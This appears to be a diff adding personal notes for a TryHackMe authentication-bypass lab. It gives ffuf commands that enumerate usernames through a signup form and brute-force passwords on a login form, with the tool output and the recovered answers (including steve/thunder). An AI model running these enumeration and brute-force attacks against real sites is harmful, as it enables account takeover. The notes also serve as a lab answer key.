@@ -1,0 +1,88 @@
+Task 2 Username Enumeration 
+
+ffuf -w  /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.63.82/customers/signup -mr "username already exists"
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.10.63.82/customers/signup
+ :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=FUZZ&email=x&password=x&cpassword=x
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Regexp: username already exists
+________________________________________________
+
+admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
+robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77]
+simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
+steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
+:: Progress: [10177/10177] :: Job [1/1] :: 127 req/sec :: Duration: [0:01:20] :: Errors: 0 ::
+
+What is the username starting with si*** ?
+simon
+
+What is the username starting with st*** ?
+steve
+
+What is the username starting with ro**** ?
+robert
+
+
+#Task 3 Brute Force 
+vi valid_usernames.txt                                                                                                                 1 ⨯
+                                                                                                                                               
+(base) ┌──(root💀lucy)-[/home/gd/Downloads]
+└─# ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.63.82/customers/login -fc 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.10.63.82/customers/login
+ :: Wordlist         : W1: valid_usernames.txt
+ :: Wordlist         : W2: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=W1&password=W2
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 200
+________________________________________________
+
+[Status: 302, Size: 0, Words: 1, Lines: 1]
+    * W1: steve
+    * W2: thunder
+
+:: Progress: [303/303] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+
+
+- What is the valid username and password (format: username/password)?
+steve/thunder
+
+
+#Task 4 Logic Flaw 
+
+
+https://tryhackme.com/room/authenticationbypass
+https://www.hackingetico.org/authentication-bypass-habitaci%C3%B3n-de-tryhackme/
